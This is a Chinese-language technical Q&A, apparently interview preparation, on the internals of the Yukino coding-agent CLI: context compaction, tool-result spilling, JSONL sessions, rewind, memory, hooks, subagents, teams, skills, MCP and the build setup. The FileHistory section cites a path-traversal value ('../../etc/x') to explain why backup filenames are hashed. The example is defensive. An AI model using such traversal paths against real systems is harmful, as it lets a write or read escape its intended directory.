3. 500ms 是体验与开销的平衡点: 人眼对进度更新的感知阈值约 200-500ms, 500ms 轮询感知流畅, 而 `statSync` 几个小文件的开销可忽略.

这呼应整体哲学: 主线用生成器 (AgentEvent) , 旁路按传输介质选择最合适的机制 —— 进程内用回调, 跨进程用轮询.

---

### 延伸思考:"这个 TUI 还有哪些性能隐患, 你会怎么优化? ", 可以从哪些点展开?

基于已有实现, 可讨论的点:

1. `messages` 数组的全量 slice: 每帧 `messages.slice(0, committed)` / `slice(committed)` 产生两个新数组, 消息上千时是 O(n) 分配. 可改为只传 `(messages, committedIndex)` 让子组件内部切片, 或对 Static 区改为"追加式"API (Ink 的 Static 本就只认新 item, 可用版本号比对) .
2. turn_summary 之前的中间渲染: 工具执行期间 `activeTools` 每次状态变化都整体重渲染动态区. `ToolDisplay` 已是 memo 友好结构, 可进一步给每个 ToolBlock 加 `React.memo` + 稳定 key (toolId) .
3. markdown 渲染的双通道: `StreamingText` 缓存了稳定前缀, 但 `MessageBlock` (assistant 提交后) 会再次全量解析同一文本 —— 提交时可把已解析结果随消息传递, 避免提交瞬间的一次全量重解析.
4. 文件扫描缓存的失效策略: `fileCacheRef` 在 InputBox 生命周期内不失效, 长会话中新建文件无法被 `@` 补全. 可加 mtime 失效或定时刷新.
5. 500ms 团队轮询可升级为混合模式: in-process teammate 直接回调, 仅跨进程回退轮询 —— `detectBackend()` (`backend.ts:43-68`) 在非 win32 且 TMUX/ITERM_SESSION_ID 均不存在时即返回 `"in-process"` (本地最常见形态) , 恰有条件做此优化.
6. 大输出的字符串成本: 工具结果拼接到消息 content 是 O(n) 字符串复制, 超长会话下 GC 压力可观; 可考虑结构化存储 (消息只持引用, 渲染时物化) .

回答框架仍然是: 定位真实瓶颈 (引用具体机制) → 给出方案 → 说明为什么当前不急着做 (YAGNI / 收益成本比) —— 这才体现工程判断力而非背优化清单.

---

## 七、上下文管理与压缩

### 上下文管理的"两道防线"是什么? 为什么预算落盘在前、compact 在后?

膨胀源治理分两级, 关键是预算处理的时机 —— 它不在每轮调 LLM 前做, 而在工具结果"入历史时"完成 (`agent.ts:503-541`) . agent.ts 注释写明 "Tool results are already budget-processed at the time they enter history", 因此 transcript 中的消息尺寸即终态, 后续压缩阈值估算可直接基于它们.

第一道 — 工具结果预算 (廉价、无损) , 分两个环节:

- 单结果落盘: 结果入历史前, 长度超过 `MAX_OUTPUT_CHARS = 50000` (`agent.ts:62`, 注释解释了取 5 万的原因: 让模型一次就能看到足够内容, 免一次 ReadFile 回读往返) → 调 `persistLargeResult()` 全文写入 `.yukino/sessions/{id}/tool-results/{toolUseId}.txt` (注意目录名是连字符 `tool-results`) , 原位置替换为 `<persisted-output>` 包裹的 2000 字符预览 + 文件路径 (`budget.ts:71` `buildSpillPreview()`, 模型需要时可 ReadFile 读回) ;
- 聚合预算: `applyBudget()` (`tool-result/budget.ts`) 处理整批 —— 一条消息内全部结果字符总数超 `MESSAGE_AGGREGATE_LIMIT = 200000` 时, 按大小降序逐个落盘直到达标 (单条 ≤ 预览长度的不落盘, 写了也没省到空间) . 并行批的多个结果落进同一条消息, 单条阈值管不住总和, 所以需要这层聚合;
- 防回环: `isSpillReadback()` (`budget.ts:92`) 识别"读回落盘文件的 ReadFile 调用", agent.ts 把它 (以及本轮已单条落盘者) 收集进 `exemptIds` 豁免集合 —— 豁免条目既不会被聚合预算再次落盘, 也不会被单条落盘二次处理 (详见「isSpillReadback 防御的无限循环场景」) .

第二道 — `manageContext()` (`compact/compact.ts`, 昂贵、有损) : 每轮调 LLM 前估算 token, 超过自动阈值才触发, 用 LLM 生成摘要重写历史 (见「压缩算法完整流程」) .

顺序的原因: budget 是"显式冗余消除", compact 是"语义有损压缩". 工具结果大是最常见的上下文膨胀源 (日志、构建输出) , 把它们落盘是无损的 (原文可回读) , 应优先; 只有无损手段仍不够时, 才动用会丢失细节的摘要压缩. 另外把预算放在"入历史时"而非"发送前"有一个工程红利: 消息一旦进历史就永不修改, Prompt Cache 前缀稳定, token 估算也可以直接按 transcript 尺寸算, 不需要在每轮发送前重新遍历修剪.

这与前端性能优化同理: 先压缩图片/删 dead code (无损) , 再上 tree-shaking 激进的语义化精简 (有损) —— 降本手段按"无损 → 有损"排序.

---

### 压缩 (compact) 算法完整流程是怎样的? 保留尾部、摘要、恢复三件套如何协同?

触发阈值 (`computeCompactThreshold()`) :

```
effectiveWindow = contextWindow - min(maxOutput, SUMMARY_OUTPUT_RESERVE=20000)
autoThreshold   = effectiveWindow - 13000    (自动触发)
hardBlock       = effectiveWindow - 3000     (强制触发, 无视熔断器)
```

以 200K 窗口、8192 输出为例: auto = 178808, hard = 188808 —— 预留约 21K 给"摘要请求本身的输入余量 + 输出空间".

保留尾部计算 (`computeKeepStartIndex()`) : 从消息尾部向前累加, 满足"≥10K token 或 ≥5 条消息"即停, 上限 40K token —— 最近的对话原文保留, 避免纯摘要的"传话游戏"信息衰减. 工具对保护: 若边界恰好把 tool_use 和 tool_result 切开, `backUpPastToolUse()` 继续向前找到对应的 assistant 消息, 保证配对完整 (孤儿 tool_result 会被 API 拒绝) . 退化保护: 可摘要前缀不足 `MIN_COMPACT_PREFIX = 2` 条时放弃压缩.

摘要生成: 9 段式结构化提示词 (用户意图、关键技术概念、文件与代码片段、错误与修复、问题解决过程、全部用户消息、待办任务、当前工作、下一步建议含原文引用) , 要求模型先输出 `<analysis>` 打草稿再输出 `<summary>`.

PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()` 捕获 PTL 错误后按"API 轮"分组丢弃最旧消息 (按需丢弃: 计算 token 缺口丢够为止; 否则丢 1/5) , 最多 3 次.

恢复附件 (`recovery.ts`) : 压缩后追加 recovery attachment —— 最近读过的 5 个文件 (各截断至 5K token) 、活跃技能 (共 25K token 预算) 、可用工具清单 —— 因为摘要可能丢掉"刚读过的文件内容"这类工作记忆.

三件套协同: 保留尾部保近期精度, 摘要保远期脉络, 恢复附件保工作记忆 —— 对应人类记忆的短时记忆、长时记忆、工作记忆三层.

另有熔断器: 连续 3 次压缩失败则暂停自动压缩 (除非达到 hardBlock 强制) .

---

### token 估算为什么用 `chars / 3.5`? 这个数字的误差如何处理?

`CHARS_PER_TOKEN = 3.5` (`compact.ts:56`) 是英文代码/文本混合语料下 Claude tokenizer 的经验均值 (英文约 4, 代码符号密集略低, 取保守值使估算偏大而宁早勿晚) .

估算函数 `estimateMessages()` 对每条消息累加 `content.length + JSON.stringify(toolUses).length + ΣtoolResults + Σthinking`, 再除以 3.5 向上取整.

误差处理策略:

1. UsageAnchor 校准 (见「UsageAnchor 用量锚点机制」) : 每轮 API 响应的真实 usage 作为锚点, 字符估算只覆盖锚点后的增量 —— 误差窗口被压缩到一两轮内;
2. 保守取向: 3.5 偏小 (对中文, 1 字 ≈ 1.5-2 token, 即 chars/token ≈ 0.5-0.7, 估算会严重低估) —— 所以还有 hardBlock 和 ContextTooLongError 的"试错兜底": 真超了 API 会报错, 触发强制压缩重试 (见「Agent 循环的自愈机制」) , 形成闭环;
3. 安全边际: 13000 的 auto margin 本质就是给估算误差预留的缓冲带.

这是工程上典型的"估算 + 测量 + 兜底"三层结构: 估算做日常决策 (便宜) , 测量做周期校准 (准确) , API 报错做最后兜底 (必然正确) .

---

### 压缩如何与会话持久化配合实现"可恢复的会话"? `compact_boundary` 是什么?

会话以 JSONL 追加写持久化 (`.yukino/sessions/{id}.jsonl`, 每行一个 `SessionMessage`) . 压缩发生时追加一条特殊记录:

```json
{
  "role": "system",
  "type": "compact_boundary",
  "content": "{\"summary\": \"...\", \"keep\": [{role, content}, ...]}"
}
```

`compact_boundary` 把摘要 + 保留尾部整体内联进会话文件. 恢复时 `rebuildFromSession()`:

1. 从尾部扫描找最后一条 boundary (多次压缩只认最新) ;
2. 有 boundary: 合成"本会话延续自之前的对话…"user 消息 (含摘要) → 依序回放 keep 消息 → 回放 boundary 之后的普通消息;
3. 无 boundary: 全量回放 (向后兼容旧会话文件) .

这个设计的精妙之处: 持久化格式与运行时压缩共用同一份数据结构 —— 压缩算法产出的 (summary, keep) 二元组直接序列化为 boundary, 恢复算法就是压缩重建算法的镜像. 不需要单独的"检查点格式", 语义自洽且单调: JSONL 是纯追加的, 恢复时只需线性扫描.

附带机制: 会话 30 天过期清理 —— `cleanExpiredSessions()` (`src/session/index.ts`) 直接 `rmSync` 整个会话子目录, jsonl 与 budget 落盘的 `tool-results/` 目录一并清除 (源码注释专门点明: 目录名带连字符, 一次 rm 同时覆盖) . 历史插曲: 早期版本里 budget 落盘写的是 `tool-results` (连字符) , 而清理代码删的却是 `tool_results` (下划线) , 目录名不匹配导致清理删不到真实落盘目录——这种"写入方与清理方各执一词"的目录名漂移是真实项目里常见的 bug 形态, 最终以"删整个会话目录"的方式收敛. 另 `newSessionId()` 用 `Date.now().toString(36) + "-" + randomBytes(4).hex` 保证可读性与唯一性.

---

### 超大工具结果"落盘 + 预览"机制中, `isSpillReadback()` 防御的无限循环具体是什么场景?

场景还原:

1. 模型执行 Bash 产生 100KB 输出 → 入历史时超 `MAX_OUTPUT_CHARS`, `persistLargeResult()` 落盘到 `tool-results/{toolUseId}.txt`, 上下文里替换为 `<persisted-output>` 包裹的 2KB 预览 + "完整结果在 xxx 路径";
2. 模型 (按设计) 用 ReadFile 去读那个落盘文件 → ReadFile 返回 100KB 内容;
3. 如果没有防回环: 这个新结果又超 50KB → 又被落盘 → 新路径给模型 → 模型再读 → 无限循环, 磁盘被无意义复制撑爆, 模型永远看不到全文.

防御: `isSpillReadback()` (`budget.ts:92`) 判断"该工具调用是否是读取 spill 目录的 ReadFile". 它在每轮工具结果入历史之前由 agent.ts 统一执行: 命中的 tool_use_id 被收集进 `exemptIds` 豁免集合, 既跳过单结果的 `persistLargeResult` 落盘, 也在聚合预算 `applyBudget` 中跳过 —— 回读内容原样留在上下文 (它是模型主动要看的, 属于"回读"而非"冗余") .

这是自指防护 (self-reference guard) 的经典案例: 任何"把 X 移出主存储并留下指针"的系统, 都必须处理"指针被解引用后产物再次进入主存储"的回环. GC 的 card marking、操作系统的 swap-in 页不再立即 swap-out 候选, 都是同构问题.

---

### 如何解释"为什么纯摘要式压缩不够好", 你会怎么论证 Yukino 的三件套方案?

论证结构:

1. 纯摘要的根本缺陷 —— 无损信息论视角: 摘要是多对一映射, 必然丢失细节. Coding Agent 的对话包含大量精确信息 (文件路径、行号、错误消息原文、代码片段) , 这些信息压缩成"用户让修一个登录 bug"级别的摘要后, 模型只能重新探索 —— 表现为压缩后反复重读文件、重复犯错.
2. 传话游戏衰减: 多次压缩时, 第二次压缩的输入是第一次的摘要 —— 摘要的摘要, 信息呈指数衰减, 远期上下文很快退化为空话.
3. Yukino 的对策是"分层保真":
   - 近期 10K-40K token 原文保留: 近端上下文是模型正在操作的工作区, 精度要求最高 —— 直接不压缩;
   - 远期用结构化摘要: 9 段式模板 (而非自由摘要) 强制保留"全部用户消息""文件与代码段""待办"等高价值维度, 是有损但有纪律的压缩;
   - 工作记忆单独恢复: 最近读过的 5 个文件内容作为恢复附件重新注入 —— 解决"摘要忘了模型刚看过什么"这一最高频痛点.
4. 类比收尾: 这对应操作系统的存储分层 —— 寄存器/L1 (保留尾部, 热数据原样) 、内存 (恢复附件, 刚换入的页) 、磁盘 (摘要, 冷数据压缩存档) . 纯摘要相当于"只有磁盘没有内存".

---

## 八、会话持久化、记忆与钩子

### 文件历史 (FileHistory) 与 `/rewind` 回滚是如何实现的? 为什么备份键用 `sha256(path)` 而不是路径本身?

机制 (`file-history/file-history.ts`) :

- 编辑前备份: `trackEdit(filePath)` 在每次 Write/Edit 前, 把当前文件内容复制到 `.yukino/file-history/{sessionId}/{sha256(path).hex.slice(0,16)}@v{N}`, 版本号在 `trackedFiles: Map` 中递增. 文件尚不存在时也递增版本 (语义: "此版本时文件不存在") .
- 回合快照: `makeSnapshot(messageIndex)` 在 loop 结束时记录"全部已追踪文件当前版本"与对话位置的对应关系, 上限 `MAX_SNAPSHOTS = 100` (丢最旧) , userText 截断 60 字符作为快照标签.
- 回滚: `rewind(snapshotIndex)` —— 把目标快照中每个文件的备份内容写回工作区; 备份缺失 (当时文件不存在) 则删除当前文件; 快照数组截断到该点 (无 redo, 回滚是破坏性的单行道) ; 版本计数器同步回退.

为什么用 `sha256(path)` 作备份文件名:

1. 路径含非法字符: 文件路径有 `/`、`..`、空格等, 不能直接当文件名;
2. 防目录穿越: 若直接用路径拼接, 恶意/异常路径 (`../../etc/x`) 可能写出备份目录 —— 哈希把任意输入压平为固定字符集, 天然免疫注入;
3. 定长: 路径长度不一, 哈希定长 16 hex, 文件系统友好;
4. 取前 16 hex (64 bit) 碰撞概率对会话级规模可忽略.

`/rewind` 的价值在于把"AI 改坏了"的恢复成本降到最低 —— 它本质是文件系统级的 time-travel debugging, 与 git 互补 (git 管提交粒度, rewind 管会话内的中间态) .

---

### 记忆系统 (Memory) 的三层结构是什么? LLM 召回与自动提取分别怎么工作?

存储层: 两级目录 —— 用户级 `~/.yukino/memory/` (跨项目: 用户偏好、反馈) 与项目级 `{workDir}/.yukino/memory/` (项目知识、参考) . 每条记忆是一个带 YAML frontmatter (name/type/description) 的 `.md` 文件. `MEMORY.md` 是自动生成的索引 (`- [name](path) -- description` 每行一条, 上限 200 行 / 25KB) .

召回层 (`manager.ts` `findRelevantMemories()`) : 每轮对话前做非阻塞预取 —— 扫描全部记忆 frontmatter (上限 200 条, 新的在前) 构建清单, 连同"最近用过的工具列表"发给 LLM, 让它选最多 5 条相关记忆 (提示词明确要求"克制挑剔") , Zod 校验 JSON 响应. 结果附"记忆年龄"警告 (>1 天提示可能过时) . 预取是 fire-and-forget: Agent 循环在工具执行后用 `Promise.race` 探针检查是否已就绪, 就绪则注入 system-reminder, 未就绪直接跳过 —— 召回绝不阻塞主循环.

提取层 (`extractor.ts`) : 对话 loop 完成后自动触发 (至少间隔 1 轮) , 派一个子代理 (工具: Read/Write/Edit/Glob/Grep, maxIterations 5, bypass 权限) 从对话中提取值得长期记忆的内容. 防重复: 提取前先注入现有记忆清单 ("更新旧文件优于新建") ; 防并发: `inProgress` 标志 + `pendingContext` 合批 (提取运行期间的新上下文合并到下一轮尾巴跑) . 子代理没输出工具调用时还有文本协议兜底 (`MEMORY_NAME:/MEMORY_TYPE:/---` 块解析) .

巩固层 (`consolidation.ts`) : 定期 (≥24 小时且 ≥5 个会话, 10 分钟扫描节流) 派子代理合并/去重/清理记忆; 用 PID 锁文件防多实例并发 (锁持有者进程活着且锁龄 <1 小时则放弃) .

设计哲学: 记忆是"慢系统" —— 全部走旁路 (预取不阻塞、提取在循环后、巩固在闲时) , 主循环只消费结果. 索引文件 (MEMORY.md) 给模型看, frontmatter 给召回 LLM 看, 正文给最终注入看 —— 三级粒度对应三级成本.

---

### Hook 系统的事件与动作模型是怎样的? `reject`、`once`、`async` 三个标志各自解决什么问题?

事件 (9 个生命周期点) : `session_start/end`、`turn_start/end`、`pre_send/post_receive`、`pre_tool_use/post_tool_use`、`shutdown` —— 覆盖了"会话-轮-请求-工具"四个粒度.

动作 (4 种) :

- `command`: 执行 shell (30s 超时、10MB 缓冲) , 注入环境变量 `YUKINO_EVENT/YUKINO_TOOL/YUKINO_FILE_PATH`;
- `prompt`: 把文本注入对话 (作为通知排队) ;
- `http`: POST JSON (整个 HookContext) 到 URL —— webhook 集成;
- `agent`: 委派给注入的 agentRunner 跑子代理.

条件表达式: `evaluateCondition()` 支持 `&&`/`||`/`!`、`==`/`!=`、`=~` (正则) 、`=*` (glob, `→.*`、`*→[^/]*`、`?→.`) , 字段含 `tool/event/file_path/message` 及工具参数 —— 如 `tool == "EditFile" && file_path =* "src/.ts"`.

三个标志:

- `reject` (仅 pre_tool_use) : hook 返回拒绝即阻止工具执行, 拒绝原因作为工具结果回喂模型 —— 实现"策略即代码" (如"禁止在 main 分支直接写文件") ; 与 `async` 互斥 (异步无法同步否决) , 配置时校验.
- `once`: `firedOnce` 集合按 hook id 去重, 每会话最多触发一次 —— 解决"会话开场白""首次提醒"类需求, 避免每轮重复注入.
- `async`: 后台执行 (`.then()` 不 await) , 立即返回 `(async)` 占位, 真实输出完成后作为通知排队注入下一轮 —— 慢操作 (如 http 上报) 不阻塞 Agent 主循环.

钩子输出统一走 `recordNotification()` 队列, 在下一轮开头被 Agent drain 成 system-reminder (见「Agent 循环 run() 的单轮迭代流程」第 3 步) —— 异步世界与生成器主线的汇合点.

---

### 会话持久化选用 JSONL 追加写而不是 SQLite/单文件 JSON, 权衡是什么?

JSONL (每行一条 JSON, 纯追加) 的优势在该场景下非常契合:

1. 追加即持久化: 每条消息一次 `appendFile` (O (消息) ) , 崩溃最多丢最后一行; 单文件 JSON 需全量重写 (O (全量) ) , 且崩溃时文件可能半截损坏导致全灭.
2. 流式恢复: 恢复时逐行解析, 坏行可跳过 (best-effort) ; 单文件 JSON 一处损坏全部不可读.
3. 天然支持"边界记录": `compact_boundary` 只是另一种行类型, schema 用 Zod 的 optional `type` 字段扩展 —— 无需迁移.
4. 可观测性: JSONL 可直接 `tail -f` 调试、`jq` 查询 —— 开发期体验好.
5. 无需依赖: SQLite 引入原生绑定与迁移负担, 对"单写者、追加为主、全量回放"的会话存储是杀鸡用牛刀.

代价: 无索引、无随机访问 (恢复要全量扫) 、无查询能力 —— 但会话场景的访问模式恰好是"顺序写 + 顺序读 + 偶尔从尾扫描找 boundary", JSONL 全部命中最优路径.

通用启示: 按访问模式选存储 —— 追加主导、全量回放、单写者的日志型负载, append-only 文本格式往往优于嵌入式数据库.

---

### 系统里有哪些"非阻塞化"设计? 请归纳 Yukino 处理慢操作的整体策略.

慢操作清单及其非阻塞化手段:

| 慢操作                | 手段            | 机制                                                              |
| --------------------- | --------------- | ----------------------------------------------------------------- |
| 记忆召回 LLM 请求     | 预取 + 竞速探测 | loop 开始时发起, `Promise.race` 探针检查, 未就绪则跳过            |
| 记忆提取/巩固子代理   | 后台执行        | loop 完成后触发, `inProgress` + pendingContext 合批               |
| 慢 hook (http 上报等) | `async` 标志    | 立即返回占位, 输出排队下轮注入                                    |
| 团队邮箱/进度         | 旁路队列 + 轮询 | 邮箱消息 drain 进下一轮; UI 500ms 轮询进度                        |
| 上下文窗口 API 查询   | 3s 超时 + 缓存  | `MODEL_FETCH_TIMEOUT_MS`, 失败回落静态表                          |
| LLM 限流等待          | 可中断睡眠      | `interruptibleSleep` 监听 abort, Ctrl+C 优雅退出                  |
| 权限/提问等待         | Promise 悬挂    | 生成器挂起, UI resolve 后恢复 (见「权限确认的 Promise 悬挂模式」) |
| 落盘大结果            | 同步小写        | 单文件 50KB 级写, 成本可忽略故不异步化                            |

整体策略可归纳为四档, 按"主循环是否需要其结果才能继续"分派:

1. 必须等待 → Promise 悬挂 (权限) ;
2. 可延迟一轮 → 队列 + 下轮 drain (hook 通知、邮箱) ;
3. 可完全跳过 → 预取 + 就绪探测 (记忆召回) ;
4. 可后台完成 → fire-and-forget + 状态文件 (提取、巩固、teammate) .

核心原则: 生成器主循环是神圣不可阻塞的 —— 一切慢操作要么挂起等待 (有界、可取消) , 要么绕开主循环走旁路. 这与浏览器主线程保护 (长任务拆分、Web Worker、requestIdleCallback) 是同一思想在不同宿主的重现.

---

## 九、多智能体、技能与 MCP

### 子代理 (Subagent) 系统如何设计? 内置三种代理的分工与工具过滤机制是什么?

定义层 (`subagent/definition.ts`) : `AgentDefinition` 声明 name/description、工具白/黑名单、systemPromptOverride、maxTurns、model、permissionMode、isolation (worktree) 等. 内置三种:

- `general-purpose`: 全权限, 处理复杂多步任务;
- `plan`: 禁 Edit/Write + plan 权限模式 —— 只读架构师, 产出实施计划;
- `explore`: 禁 Edit/Write + plan 模式 + `model: "haiku"` —— 用便宜模型做代码探索, 是成本分层设计: 探索类任务 token 消耗大但智力要求低, 用弱模型省钱.

派生层 (`spawn.ts`) : `spawnSubagent()` 为子代理创建全新 `ConversationManager` (隔离上下文, 防污染主线) ; 模型解析优先级 `调用方覆盖 > 定义指定 > 父级模型`, 模型不同时新建 LLMClient 否则复用父客户端; `maxIterations = maxTurns ?? 200`; `onProgress` 回调向 UI 汇报 turn/lastTool.

工具过滤 (`tool-filter.ts`, 源码注释标明六层) : MCP 工具 (`mcp__*` 前缀) 始终放行 → 全局黑名单 `SUBAGENT_DISALLOWED_TOOLS` (ExitPlanMode/Agent/AskUserQuestion/TaskStop, 防子代理再派生子代理失控) → 自定义代理附加黑名单 (当前与全局相同, 为扩展性单列) → 异步 (后台) 代理白名单 → 定义级黑名单 → 定义级白名单 (`["*"]` 除外) .

防递归 fork: fork 路径 (继承父上下文运行) 有双重检测 —— `querySource` 标记 + 扫描对话中的 `<fork_boilerplate>` 标签; fork 出的代理拿到的是克隆注册表 (`cloneRegistryForFork()` 把 Agent 工具深拷贝并打上 fork 标记) , 使其再次 fork 时能被识别并拒绝.

三种执行路径 (`agent-tool.ts`) : `team_name` → 作为团队成员运行; 无 `subagent_type` → fork (继承父上下文) ; 指定定义 → 标准派生.

---

### 团队 (Teams) 多智能体协作的通信机制是什么? 文件邮箱协议如何工作?

拓扑: lead (主代理) + 若干 teammate (后台代理进程/协程) , 星型通信 —— teammate 只与 lead 通信, 不互相对话, 降低协调复杂度.

文件邮箱 (`teams/file-mailbox.ts`) :

- 每个成员一个 JSON 数组邮箱文件 (`.yukino/teams/{team}/inboxes/{member}.json`, 消息对象含 `from/text/timestamp/read` 字段, 损坏的数组记录逐条跳过、整体降级为空邮箱) ;
- 写锁: `O_CREAT|O_EXCL` (`wx` 标志) 创建 `{file}.lock` 实现互斥, 总获取超时 5s (超时抛错而非丢消息) , 锁龄超 10s 视为 stale 可强取, 重试用指数退避加抖动 (5ms 起、上限 80ms) 并以 `Atomics.wait` 同步睡眠 (不耗事件循环) ;
- 读游标: 消息级 `read` 标记 (而非独立游标文件) , `receiveSync()` 在锁内做"读全部 → 过滤未读 → 原地置 read → 全量写回"的读改写, 返回未读消息 —— 增量消费, 避免全量重读.

生命周期 (`spawnTeammate()` 主循环) : 执行任务 → 完成后状态置 idle 并向 lead 邮箱发 `[idle] name (reason)` → 每 500ms 轮询自己邮箱 → 收到 `[shutdown]` 退出; 收到新任务则拼接为下一轮提示继续工作 → 退出时持久化对话 transcript.

lead 侧感知: `TeamManager.drainLeads()` 把各邮箱未读消息包装为 `<task-notification team="...">` XML, 经 Agent 循环的 `notificationFn` 注入主线 system-reminder (复用「Agent 循环 run() 的单轮迭代流程」第 3 步的 drain 通道) .

后端 (`backend.ts`) : `detectBackend()` (line 43-68) 在 win32 上直接返回 `"in-process"`, 否则调 `detectBackendFromEnv()` 按环境探测 —— 检测到 `TMUX` 环境变量返回 `"tmux"` (每 teammate 一个 tmux 窗口) , 检测到 `ITERM_SESSION_ID` 返回 `"iterm"`, 都没有才回退 `"in-process"`. iterm 后端已实现 (backend.ts:151-175) : 用 osascript 驱动 iTerm2 AppleScript, 在当前窗口开新标签页执行 teammate 命令 (镜像 tmux 的 new-window 行为) ; 标签页没有可编程句柄, 取消动作交给邮箱 shutdown 流程. tmux 后端则是 `tmux new-window` 失败时回退 `new-session -d` 建独立会话.

为什么用文件而不是 IPC/socket: 跨后端可移植 —— 同一套协议在 in-process、子进程、tmux 窗格间都成立; 崩溃恢复天然 (邮箱是持久化的) ; 调试友好 (直接 cat 邮箱文件) . 代价是轮询延迟与锁竞争, 在" teammate 数量少、消息频率低"的场景下完全可接受.

---

### 技能 (Skill) 系统的 inline 与 fork 两种执行模式有什么区别? 技能加载的目录扫描顺序为何设计成这样?

技能格式: 目录 + `SKILL.md` (YAML frontmatter: `name/description/allowed_tools/mode/model/fork_context`) .

inline 模式 (`executor.ts`) : 技能正文替换 `$ARGUMENTS` 占位符 (或追加 `User Request:`) , 通过 `host.activateSkill(name, body)` 注入当前会话上下文 —— 技能是"提示词级别的 SOP 展开", 模型在当前对话里按 SOP 行事. 适合流程指导类技能 (如"如何做 code review") .

fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 控制父上下文继承量: `none` (默认, 完全隔离) / `recent` (带父对话最近 5 条) / `full` (最近 100 条) . 适合会产生大量中间输出的任务 (如"批量重构"—— 中间过程不进主线污染上下文, 只回传最终报告) .

目录扫描顺序 (`catalog.ts:61-68`, 6 个目录, 后者覆盖同名前者) :

```
~/.claude/skills → ~/.github/skills → ~/.yukino/skills
→ {project}/.claude/skills → {project}/.github/skills → {project}/.yukino/skills
```

设计意图:

1. 内置 < 用户 < 项目: 越靠近当前项目的配置优先级越高, 与 Git/ESLint 的配置级联惯例一致;
2. 兼容生态: 扫描 `.claude`/`.github` 目录意味着可直接复用 Claude Code 等生态的已有技能库 —— 降低用户迁移成本, 是务实的生态策略;
3. 覆盖语义: 同名覆盖而非合并, 简单可预测.

热重载: `get()` 比对文件 mtime, 变了就重读重解析 (失败保留旧版) ; `needsReload()` 靠目录 mtime 感知增删 —— 技能开发时可即改即试. 技能还被注册为斜杠命令 (`/<name>`) , 且模型可通过 `LoadSkillTool` 自主激活 —— 人驱与模型驱两个入口.

---

### MCP (Model Context Protocol) 是如何接入的? 为什么 MCP 工具默认 deferred?

接入链 (`mcp/manager.ts` → `client.ts` → `tool-wrapper.ts`) :

1. 连接: `MCPManager.connectAll(configs)` 为每个服务器建 `MCPClient`, 支持三种传输 —— stdio (`command + args`, 环境变量 `${VAR}`/`$VAR` 展开) 、StreamableHTTP (URL 型默认) 、SSE (显式指定) ;
2. 发现: 连接后 `listTools()` 拉取工具清单, 服务器 instructions 收集后注入 system-reminder;
3. 适配: 每个 MCP 工具包一个 `MCPToolWrapper` 实现统一 `Tool` 接口 —— 名称消毒为 `mcp__{server}__{tool}` (非字母数字转 `_`) , `execute()` 内部调 `client.callTool()`, 把 MCP 的 content 数组拍平为文本, 保留 `isError`;
4. 注册: wrapper 注册进全局 `ToolRegistry`, 从此对 Agent/权限/调度完全透明 —— MCP 工具与内置工具走同一条执行管线.

为什么 MCP 工具注册时默认 `deferred = true` (`mcp/tool-wrapper.ts:78`, eager 模式除外 —— 见「MCP 工具进入上下文的三种模式」) :

1. 上下文成本: MCP 服务器动辄暴露几十个工具 (如 GitHub MCP 有 90+) , 全量 schema 会吃掉大量窗口并稀释注意力 —— 延迟加载 (见「延迟工具机制」) 让模型先经 ToolSearch 发现再启用;
2. 信任分级: MCP 是第三方代码, schema 里可能含提示注入内容, 不进入初始上下文等于默认最小暴露面;
3. 缓存稳定: 工具列表稳定是 prompt caching 命中的前提, MCP 工具不进入初始列表, 其变化就不会打破前缀缓存.

子代理侧 MCP 工具始终放行 (`mcp__*` 前缀直通工具过滤第一层) —— 因为 deferred 发现机制在子代理中同样生效, 过滤只挡危险能力, 不挡"需要搜索才能看到"的工具.

---

### 对比"子代理 fork / 技能 fork / 团队 teammate"三种并发形态, 各自的适用场景与设计取舍是什么?

| 维度     | 子代理 (Agent tool)       | 技能 fork                      | 团队 teammate                     |
| -------- | ------------------------- | ------------------------------ | --------------------------------- |
| 触发者   | 模型自主决策              | 用户 `/skill` 或模型 LoadSkill | 模型调 TeamCreate/SpawnTeammate   |
| 上下文   | 全新 (或 fork 继承)       | 全新 + fork_context 控制       | 全新                              |
| 生命周期 | 一次性, 跑完即返          | 一次性                         | 长驻, idle 后等新任务             |
| 通信     | 返回值 (最终报告)         | 返回值                         | 文件邮箱双向持续通信              |
| 模型     | 可指定 (explore 用 haiku) | 可指定                         | 与 lead 相同                      |
| 适用场景 | 独立子任务 (探索/计划)    | 流程化 SOP 的隔离执行          | 长周期并行工作流 (前后端同时开发) |

取舍分析:

- 子代理是"函数调用": 同步等待返回值, 封装性最强, 适合主线依赖其结果的任务. 代价是阻塞主线.
- 技能 fork 是"带 SOP 的函数调用": 与子代理机制相同但载荷是技能正文 —— 把"怎么做"的知识打包复用.
- teammate 是" actor 进程": 异步、长驻、有邮箱 —— 表达力最强 (持续协作) , 但引入状态管理 (idle/轮询/关闭协议) 、调试复杂度, 只在真正需要并行长任务时值得.

统一底座: 三者都复用同一个 `Agent` 类 + `spawnSubagent()` 设施, 差异仅在上下文来源、生命周期管理、通信通道三个参数上 —— 这是"一个核心引擎, 多种并发语义"的优雅设计.

---

## 十、工程化: 构建、测试与配置

### 构建系统 (tsup) 有哪些针对 CLI 产物的特殊处理? 为什么要 `noExternal: [/.*/]`?

`tsup.config.ts` 的关键决策:

1. 单入口 ESM 产物: `src/main.tsx` → `dist/`, Node 20 target, minify. shebang 通过 banner 注入 (`#!/usr/bin/env node`) , 并附 `createRequire` 垫片 —— ESM 产物中某些 CJS 依赖会调用 `require()`, 垫片在 ESM 作用域重建 require (注释点名 signal-exit 这类调用 `require("assert")` 的场景) .
2. 全量内联 (`noExternal: [/.*/]`) : 除三类被 esbuild 插件显式 external 的模块 —— Node 内建模块 (`builtinModules` 正则) 、`react-devtools-core`、`sharp` (原生预编译二进制, 无法打包) —— 全部依赖打进单文件. 动机:
   - 分发可靠性: npm 安装时依赖树解析失败/peer 冲突是 CLI 工具最常见的安装事故, 单文件产物零依赖 = 零安装事故;
   - 启动速度: 单文件免去 Node 在 node_modules 中的模块解析 (成千次 stat) , 冷启动显著更快 —— CLI 对启动延迟极度敏感;
   - 可安装为单二进制: 为后续 SEA (Single Executable Application) 分发铺路.
3. post-build 资源拷贝 (`onSuccess`) : 把 `../glob-wasm/build/release.wasm` 拷为 `dist/glob.wasm` —— Glob/Grep 工具由 workspace 包 `@yukino.js/glob-wasm` (WebAssembly 实现, package.json devDependencies) 驱动, 打包进去的是它的 JS wrapper, wasm 二进制在运行时从 bundle 入口旁加载 (wrapper 同时内嵌 base64 兜底) . 注释特别点明: 旧的 Node 原生 addon 方案已被替换, wasm 方案天然跨平台, 不再需要按平台预构建.

